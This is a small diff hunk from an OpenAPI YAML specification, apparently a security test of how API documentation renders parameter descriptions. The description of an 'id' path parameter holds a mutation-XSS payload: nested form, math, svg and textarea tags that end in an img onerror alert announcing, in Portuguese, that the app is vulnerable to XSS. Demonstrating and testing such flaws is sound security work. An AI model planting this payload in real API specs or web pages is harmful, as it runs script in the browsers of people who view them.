@@ -28,7 +28,6 @@ paths:
       parameters:
         - description: |
             <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('Essa app esta vulneravel a XSS') src=1>"></form>
-
           format: int64
           in: path
           name: id
